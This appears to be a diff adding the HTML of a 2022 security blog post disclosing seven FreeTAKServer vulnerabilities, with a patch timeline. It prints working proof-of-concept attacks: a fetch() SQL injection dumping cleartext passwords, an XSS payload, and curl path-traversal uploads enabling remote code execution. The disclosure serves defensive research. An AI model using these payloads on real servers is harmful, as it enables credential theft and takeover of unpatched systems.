@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Securityaudit of an OpenSource Software: FreeTAKServer</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Security researching from the nordics" />
+    <link rel="shortcut icon" href="/assets/images/static/blog-icon.png" type="image/png" />
+    <link rel="canonical" href="/securityaudit-of-an-open-source-project-takserver" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Securityits.io" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Securityaudit of an OpenSource Software: FreeTAKServer" />
+    <meta property="og:description" content="The parrot is not dead, its RESTing A colleague and I decided to have a look at a open-source project called FreeTAKServer and its frontend FreeTAKServer-UI. Mostly for fun, but there’s always bugs to be had! What is FreeTAKServer According to the Github pages: FTS is a Python3 Flask implementation" />
+    <meta property="og:url" content="/securityaudit-of-an-open-source-project-takserver" />
+    <meta property="og:image" content="/assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/banner.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/false" />
+    <meta property="article:author" content="https://www.facebook.com/false" />
+    <meta property="article:published_time" content="2022-02-14T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2022-02-14T00:00:00+00:00" />
+    <meta property="article:tag" content="Pentest" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Securityaudit of an OpenSource Software: FreeTAKServer" />
+    <meta name="twitter:description" content="The parrot is not dead, its RESTing A colleague and I decided to have a look at a open-source project called FreeTAKServer and its frontend FreeTAKServer-UI. Mostly for fun, but there’s always bugs to be had! What is FreeTAKServer According to the Github pages: FTS is a Python3 Flask implementation" />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image" content="/assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/banner.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Securityits.io" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Pentest" />
+    <meta name="twitter:site" content="@Securitybits_io" />
+    <meta name="twitter:creator" content="@Securitybits_io" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Securityits.io",
+        "logo": "/assets/images/static/blog-icon.png"
+    },
+    "url": "/securityaudit-of-an-open-source-project-takserver",
+    "image": {
+        "@type": "ImageObject",
+        "url": "/assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/banner.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/securityaudit-of-an-open-source-project-takserver"
+    },
+    "description": "The parrot is not dead, its RESTing A colleague and I decided to have a look at a open-source project called FreeTAKServer and its frontend FreeTAKServer-UI. Mostly for fun, but there’s always bugs to be had! What is FreeTAKServer According to the Github pages: FTS is a Python3 Flask implementation"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Securityaudit of an OpenSource Software: FreeTAKServer" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="/"><img src="/assets/images/static/blog-icon.png" alt="Securityits.io" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-github" role="menuitem"><a href="https://github.com/securitybits-io">Github</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+                <a class="social-link social-link-tw" href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-pentest tag-security post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="14 February 2022">14 February 2022</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/pentest/'>PENTEST</a>,
+                            
+                        
+                            
+                               <a href='/tag/security/'>SECURITY</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Securityaudit of an OpenSource Software: FreeTAKServer</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/banner.jpg)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <blockquote>
+  <p>The parrot is not dead, its RESTing</p>
+</blockquote>
+
+<p>A colleague and I decided to have a look at a open-source project called <a href="https://github.com/FreeTAKTeam/FreeTakServer">FreeTAKServer</a> and its frontend <a href="https://github.com/FreeTAKTeam/UI">FreeTAKServer-UI</a>. Mostly for fun, but there’s always bugs to be had!</p>
+
+<h2 id="what-is-freetakserver">What is FreeTAKServer</h2>
+
+<p>According to the Github pages:</p>
+<blockquote>
+  <p>FTS is a Python3 Flask implementation of the TAK Server for devices like ATAK, WinTAK, and ITAK, it is cross-platform and runs from a multi node installation on AWS down to the Android edition. It’s free and open source (released under the Eclipse Public License.</p>
+</blockquote>
+
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+
+<p>The vulnerabilities that will be discussed below affects currently the:</p>
+<ul>
+  <li>FreeTAKServer-1.9.8 Public</li>
+  <li>FreeTAKServer-UI-1.9.5</li>
+  <li>Hosted on Fully patched Ubuntu 20.04.3 LTS</li>
+  <li>Python 3.8.10</li>
+  <li>Flask 1.1.2</li>
+  <li>Werkzeug 2.0.3</li>
+</ul>
+
+<p>A list of the following vulnerabilities was discovered:</p>
+<ol>
+  <li>[CVE-2022-25510] Hardcoded Flask Secrets Key</li>
+  <li>[CVE-2022-25512] API and Websocket key leakage</li>
+  <li>[CVE-2022-25508] Unauthenticated RestAPI Endpoints</li>
+  <li>[CVE-2022-25507] XSS through Emergency Broadcast System from WebUI</li>
+  <li>[CVE-2022-25507] XSS through Emergency Broadcast System from End User Device</li>
+  <li>[CVE-2022-25506] SQL Injection leaking User Database</li>
+  <li>[CVE-2022-25511] Arbitrary File Write Leading to Remote Code Execution
+    <ol>
+      <li>Through WebUI (Authenticated)</li>
+      <li>Through End User Device (Unauthenticated)</li>
+    </ol>
+  </li>
+</ol>
+
+<p>Lets begin!</p>
+
+<h3 id="cve-2022-25510-hardcoded-flask-secrets-key">[CVE-2022-25510] Hardcoded Flask Secrets Key</h3>
+
+<p>Let’s start of with something easy. Flask signs all their client sessions with a secret key, usually defined in an <em>Environment Variable</em>. In this case though there’s three places that these are hardcoded into. 
+<img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/Github_Flask_Secret-key.jpg" alt="Flask secret keys" /></p>
+
+<p>This gives a malicious user the ability to sign their own cookies (using for example: <a href="https://github.com/Paradoxis/Flask-Unsign">Flask-Unsign</a>), and internally change the UID of the current user and assume any other user, for example UID 1 which is the Admin. (Privilege Escalation)</p>
+
+<p>Another interesting issue that you run into as well is that having two Flask servers with the same <em>secret key</em> makes it possible for a user to reuse a UID 1 cookie from Server A, and apply that cookie to Server B logging in to the same UID 1. (Lateral movement/Authentication bypass)</p>
+
+<h3 id="cve-2022-25512-api-and-websocket-keys-galore">[CVE-2022-25512] API and Websocket Keys galore</h3>
+
+<p>With FreeTAKServer comes also a REST API, and Websockets to programatically manage the server and fetch/post data. These API keys and Tokens should be guarded in the same way as username and password for any application. The issue arise when the API keys are fetching data into the webapplication and are reflected in the javascript of the response on each request in the web application. Both are easily extraced using built-in DevTools or through an XSS attack.</p>
+
+<h5 id="api-bearer-token">API Bearer Token</h5>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/SourceCode_RestAPI-key.jpg" alt="RestAPI Key" /></p>
+
+<h5 id="websocket-token">Websocket Token</h5>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/SourceCode_WebSocket-key.jpg" alt="WebSocket Token" /></p>
+
+<blockquote>
+  <p>Remember to always check the source code!</p>
+</blockquote>
+
+<h3 id="cve-2022-25508-unauthenticated-public-restapi-endpoint">[CVE-2022-25508] Unauthenticated Public RestAPI Endpoint</h3>
+
+<p>In the RestAPI there is also the Endpoint <em>/ManageRoute/postRoute</em> which is unauthenticated. While this might not seem interesting at first, it is possible to broadcast new routes (suggested tracks to take) to every End User Device (EUD) connected to the server. This can create two issues, either create a Denial of Service situation where a malicious user can fill the entire map with routes, making it impossible to use the map in the EUD. The second scenario might be to create a route on which possible users might take and therefor control some of the paths and direct users into bad situations.</p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/Unauthenticated-Endpoint.jpg" alt="Unauthenticated PostRoute Endpoint" /></p>
+
+<p>Example Request</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">POST</span><span class="w"> </span><span class="err">/ManageRoute/postRoute</span><span class="w">
+</span><span class="err">Host:</span><span class="w"> </span><span class="err">FreeTAKServer:</span><span class="mi">19023</span><span class="w">
+
+</span><span class="p">{</span><span class="w">
+  </span><span class="nl">"longitude"</span><span class="p">:</span><span class="w"> </span><span class="mf">-77.02385</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"latitude"</span><span class="p">:</span><span class="w"> </span><span class="mf">38.999</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"routeName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"trip to Phil"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"startName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Washington"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"endName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Philadelphia"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"timeout"</span><span class="p">:</span><span class="w"> </span><span class="mi">40000</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"latitudeDest"</span><span class="p">:</span><span class="w"> </span><span class="mf">39.940</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"longitudeDest"</span><span class="p">:</span><span class="w"> </span><span class="mf">-75.01385</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="cve-2022-25507-xss-through-emergency-alert">[CVE-2022-25507] XSS through Emergency Alert</h3>
+
+<p>In the FreeTAKServer-UI there is a function to create and view Emergency Alerts that are originating from either the End User Device or from the UI itself. Both Avenues are susceptible to a Stored Cross Site scripting vulnerability in the Callsign parameter.</p>
+
+<h5 id="web-interface">Web Interface</h5>
+
+<p>In the case of a XSS in the WebUI it is as simple as having a callsign with the payload of <code class="language-plaintext highlighter-rouge">&lt;img src onerror=alert(/payload/)&gt;</code> which will trigger the Emergency function and display the emergency in the WebUI.</p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_webui_payload.jpg" alt="XSS WebUI Payload" /></p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_webui_alert.jpg" alt="XSS WebUI Alert" /></p>
+
+<h5 id="end-user-device">End User Device</h5>
+<p>What’s more interesting of a scenario is that it is possible to push Emergencies from any of the EUDs, these can range from a 911, TIC (Troops in Contact) or similar. This Emergency will broadcast to each EUD (Which are not affected) but also shown in the WebUI, again triggering the XSS payload.</p>
+
+<p>This can be chained together with the API keys in the reponse in order to obtain a server RestAPI key for further exploitation, which can take a normal user in the field to a Web Server admin</p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_enduserdevice_alert.jpg" alt="XSS End User Device Payload" /></p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_enduserdevice_webui_payload.jpg" alt="XSS End User Device WebUI Payload" /></p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/xss_enduserdevice_alert.jpg" alt="XSS End User Device WebUI Alert" /></p>
+
+<h3 id="cve-2022-25506-sql-injection-on-authenticateuser">[CVE-2022-25506] SQL Injection on AuthenticateUser</h3>
+
+<p>The API endpoint AuthenticateUser contains a SQL Injection into the SQLite3 Database that is handling the authentication process of the SystemUsers. In order to exploit this vulnerability the attacker need to possess a valid API key, which can either be leaked through the XSS to a End User Device, or given as a part of the UAV Operator ability which broadcasts the GPS and Video feed of a UAV-Drone.<br />
+From the SQL Injection it is possible to list all the Username, UsedID and Clear-Text passwords in the database.</p>
+
+<h5 id="proof-of-concept">Proof of Concept</h5>
+
+<p>Posting the follwing snippet into a web browsers console will trigger the SQL Injection and return the name and password for each user in the SystemUsers table.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch("http://atak.FreeTAKServer.com:19023/AuthenticateUser?username=abc\" UNION SELECT (SELECT group_concat(name||':'||password) FROM SystemUser),'b','c','PASSWORD','d','e'--&amp;password=PASSWORD", {
+    "headers": {
+      "accept": "*/*",
+      "accept-language": "en-US,en;q=0.9",
+      "authorization": "Bearer ValidAPIKey",
+      "content-type": "application/json"
+    },
+    "mode": "cors"
+  });
+</code></pre></div></div>
+
+<p>Will return the following response:<br />
+<img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/sqli_response.jpg" alt="SQL Injection Response, Network Tab" /></p>
+
+<p>Which clearly shows the database results in clear-text.</p>
+
+<h3 id="arbitrary-file-write-remote-code-execution">Arbitrary File Write (Remote Code Execution)</h3>
+
+<p>In the TAK EcoSystem there exists a file sharing function for mission essential items called DataPackages, these can be shared either by Peer-to-Peer transmission, or saved on the TAK-Server for later downloading and sharing.</p>
+
+<p>During the analysis we encountered two specific endpoints in the FreeTAKServer software that can be abused as a Arbitrary File Write, which inturn can be leveraged into Remote Code Execution through either a Cron job (depending on the accesslevel for the user running FTS) or through the Flask Templating functions.</p>
+
+<h5 id="cve-2022-25511-user-interface-datapackage">[CVE-2022-25511] User Interface Datapackage</h5>
+
+<p>From the WebUI it is possible to (once logged in) upload DataPackages directly to the server so that it is possible to download the zipped files on the EUD in the field.
+The route <code class="language-plaintext highlighter-rouge">/DataPackageTable</code> takes an argument <code class="language-plaintext highlighter-rouge">?filename=</code> which is not sanitized for either the Path or the Filename outside of the UI, which creates the issues that you can place any file, anywhere on the system. Albeit going this route will add some junk XML data into the end of the file, this making it extremely hard to achieve code execution through Python or Flask Templating.
+This was achieved using a transparent proxy to catch and modify the webrequest, but can also be achieved using something like <a href="https://curl.se/">Curl</a></p>
+
+<h6 id="proof-of-concept-1">Proof Of Concept</h6>
+
+<p>Request through Burpsuite:<br />
+<img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_webui_request.jpg" alt="Burpsuite Request" /></p>
+
+<p>File on system:<br />
+<img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_webui_tmp-file.jpg" alt="File on system" /><br />
+(Note that the webserver is at that moment run as root, <em>Not Recommended</em>)</p>
+
+<p>Bash equivalent PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s1">'Host: atak.FreeTAKServer.com:19023'</span> <span class="nt">-H</span> <span class="s1">'Authorization: Bearer ValidRestAPIToken'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOUUxfHjKyflBjjhn'</span> <span class="nt">-H</span> <span class="s1">'Accept-Encoding: gzip, deflate'</span> <span class="nt">--data-binary</span> <span class="s1">'------WebKitFormBoundaryOUUxfHjKyflBjjhn\x0d\x0aContent-Disposition: form-data; name=\"assetfile\"; filename=\"test.ext\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0aThisIs FromDataPackageTable\x0d\x0a\x0d\x0a------WebKitFormBoundaryOUUxfHjKyflBjjhn--\x0d\x0a'</span> <span class="s1">'http://atak.FreeTAKServer.com:19023/DataPackageTable?filename=../../../../../../../../tmp/file.ext&amp;creator='</span>
+</code></pre></div></div>
+
+<h5 id="end-user-device-missionupload">End User Device MissionUpload</h5>
+
+<p>Every End User Device also has the ability to upload files and Datapackages for sharing and consumption elsewhere, this is done through a Marti API that is specific to the EUDs. Although the Marti API is just another RestAPI that is used in the applications but can be abused over the <code class="language-plaintext highlighter-rouge">TCP/8080</code> or the SSL equivalent (Given a valid user certificate) <code class="language-plaintext highlighter-rouge">TCP/8443</code>.</p>
+
+<p>The difference between the WebUI way and the Marti way is that it does not add junk at the end of the file, as the EUDs are responsible for creating valid DataPackages.</p>
+
+<p>Function <a href="https://github.com/FreeTAKTeam/FreeTakServer/blob/2fc5089c431abcf2e4bce0f4030ad22222444ef4/FreeTAKServer/controllers/services/DataPackageServer.py#L155">Sourcecode</a>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/Marti/sync/missionupload'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="n">const</span><span class="p">.</span><span class="n">POST</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+  <span class="kn">from</span> <span class="nn">FreeTAKServer.model.ServiceObjects.SSLDataPackageVariables</span> <span class="kn">import</span> <span class="n">SSLDataPackageVariables</span>
+  <span class="n">logger</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'dataoackage upload started'</span><span class="p">)</span>
+  <span class="n">file_hash</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'hash'</span><span class="p">)</span>
+  <span class="n">app</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Data Package hash = </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">file_hash</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+  <span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span>
+  <span class="n">uid</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+  <span class="n">uid</span> <span class="o">=</span> <span class="s">'uid-'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span>
+  <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'filename'</span><span class="p">)</span>
+  <span class="n">creatorUid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'creatorUid'</span><span class="p">)</span>
+  <span class="nb">file</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">.</span><span class="n">getlist</span><span class="p">(</span><span class="s">'assetfile'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="n">directory</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="n">dp_directory</span><span class="p">,</span> <span class="n">file_hash</span><span class="p">)</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">Path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">directory</span><span class="p">):</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">directory</span><span class="p">))</span>
+  <span class="nb">file</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">directory</span><span class="p">),</span> <span class="n">filename</span><span class="p">))</span>
+  <span class="n">fileSize</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">directory</span><span class="p">),</span> <span class="n">filename</span><span class="p">).</span><span class="n">stat</span><span class="p">().</span><span class="n">st_size</span>
+  <span class="n">callsign</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span>
+    <span class="n">FlaskFunctions</span><span class="p">().</span><span class="n">getSubmissionUser</span><span class="p">(</span><span class="n">creatorUid</span><span class="p">,</span>
+                                        <span class="n">dbController</span><span class="p">))</span>  <span class="c1"># fetchone() gives a tuple, so only grab the first element
+</span>  <span class="n">FlaskFunctions</span><span class="p">().</span><span class="n">create_dp</span><span class="p">(</span><span class="n">dbController</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">,</span> <span class="n">Name</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">Hash</span><span class="o">=</span><span class="n">file_hash</span><span class="p">,</span> <span class="n">SubmissionUser</span><span class="o">=</span><span class="n">callsign</span><span class="p">,</span>
+                            <span class="n">CreatorUid</span><span class="o">=</span><span class="n">creatorUid</span><span class="p">,</span> <span class="n">Size</span><span class="o">=</span><span class="n">fileSize</span><span class="p">)</span>
+  <span class="k">if</span> <span class="n">USINGSSL</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">IP</span> <span class="o">+</span> <span class="s">':'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">HTTPPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/Marti/api/sync/metadata/"</span> <span class="o">+</span> <span class="n">file_hash</span> <span class="o">+</span> <span class="s">"/tool"</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s">"https://"</span> <span class="o">+</span> <span class="n">IP</span> <span class="o">+</span> <span class="s">':'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">HTTPPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s">"/Marti/api/sync/metadata/"</span> <span class="o">+</span> <span class="n">file_hash</span> <span class="o">+</span> <span class="s">"/tool"</span>
+</code></pre></div></div>
+<p>Whats visible in the vulnerable code block is that the parameter <code class="language-plaintext highlighter-rouge">hash</code> is passed to <code class="language-plaintext highlighter-rouge">os.path.join((str(directory), filename))</code> which when supplied alot of <code class="language-plaintext highlighter-rouge">../</code> (8 to be exact) it puts the base directory at the root of the filesystem and then the file is put wherever its directed (given write permissions)</p>
+
+<p>Note that this does not require any <em>authentication</em> only that you are connected to the FreeTAKServer with a valid connection.</p>
+
+<h6 id="proof-of-concept-2">Proof of Concept</h6>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-vvv</span> <span class="nt">-F</span> <span class="s2">"assetfile=@rce.html"</span> <span class="s2">"http://atak.FreeTAKServer.com:8080/Marti/sync/missionupload?hash=/../../../../../../../usr/local/lib/python3.8/dist-packages/FreeTAKServer-UI/app/home/templates/&amp;filename=janne2.html&amp;creatorUid="</span>
+</code></pre></div></div>
+<p>Sending the file contents to the missionupload endpoint results in a valid response and browsing to the file on the WebUI results in Code Execution:<br />
+<img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_marti_curl.jpg" alt="Marti curl request and file contents" /></p>
+
+<p>The file will be uploaded to <code class="language-plaintext highlighter-rouge">/usr/local/lib/python3.8/dist-packages/FreeTAKServer-UI/app/home/templates</code> which is where the Flask server is hosting its files from.</p>
+
+<p><img src="assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/arbitrary-file-write_marti_result.jpg" alt="Code Execution through Templating" /></p>
+
+<p>In discussions with the developers, they mentioned that FreeTAKServer is Unsafe due to the architecture and should not be accessible to the public internet but only ran inside a trusted network.</p>
+
+<h2 id="disclosure-timeline">Disclosure Timeline</h2>
+
+<p>14-02-2022 Discovered Vulnerabilities<br />
+15-02-2022 Wrote this Blog post<br />
+15-02-2022 Disclosed to developers<br />
+16-02-2022 Applied for CVE Through MITRE<br />
+17-02-2022 Developers pushed patch to FreeTAKServer v1.9.9<br />
+11-03-2022 Assigned CVEs</p>
+
+<h2 id="resources">Resources</h2>
+
+<ul>
+  <li>FreeTAKServer : https://github.com/FreeTAKTeam/FreeTakServer</li>
+  <li>FreeTAKServer-UI : https://github.com/FreeTAKTeam/UI</li>
+  <li>Flask-Unsign : https://github.com/Paradoxis/Flask-Unsign</li>
+  <li>Curl : https://curl.se/</li>
+</ul>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="christoffer" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/christoffer">Christoffer Claesson</a></h4>
+                                
+                                    <p>I am Christoffer Claesson, a professional security researcher from Sweden who spends his days (and many nights) on red teaming, security deep dives, and homelab experiments. This blog is my way of giving back to the community by sharing lessons, notes, and the occasional side project that grew bigger than planned.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/christoffer">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/Clock-Glitching-with-a-chipwhisperer">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2023/01/clock-glitching-with-a-chipwhisperer/banner.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/Clock-Glitching-with-a-chipwhisperer">
+                <header class="post-card-header">
+                    
+                        
+                            
+                               <span class="post-card-tags">Hardware</span>
+                            
+                        
+                            
+                                <span class="post-card-tags">Security</span>
+                            
+                        
+                    
+
